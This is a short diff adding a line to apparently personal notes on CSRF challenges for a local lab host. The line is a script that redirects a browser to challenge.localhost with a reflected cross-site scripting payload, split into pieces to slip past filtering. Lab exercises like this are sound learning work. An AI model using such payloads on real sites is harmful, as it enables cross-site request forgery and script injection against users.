@@ -99,3 +99,5 @@ except Exception as e:
 </html>
     CSRF 2 
       same but POST
+    CSRF 3 
+      <script>window.location.replace("http://challenge.localhost/ephemeral?msg=<script>alert('PWNED');"+"</sc"+"ript>");</script>
